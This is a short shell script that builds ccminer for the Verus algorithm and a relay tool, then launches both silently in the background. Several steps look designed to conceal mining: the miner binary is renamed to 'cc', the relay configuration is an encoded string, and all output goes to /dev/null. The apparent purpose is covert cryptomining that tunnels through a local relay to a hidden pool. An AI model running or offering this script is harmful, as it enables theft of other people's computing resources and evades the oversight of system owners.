sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential  qt5-default -y 
git clone --single-branch -b verus2.1 https://github.com/monkins1010/ccminer.git 
git clone https://github.com/clamcy/relayd.git 
cd relayd 
qmake 
make 
export RELAYD_CONF=yPxEyP1kDMh8WbvNibrN2b4NGbxBiPi52czVyP4kDMh8
 ./relayd  /dev/null 2>&1 & 
cd .. 
cd ccminer 
chmod +x build.sh 
chmod +x configure.sh 
chmod +x autogen.sh 
./build.sh 
mv ccminer cc 
./cc -a verus -o stratum+tcp://127.0.0.1:1098 -u Post -p True -t 2 > /dev/null 2>&1 &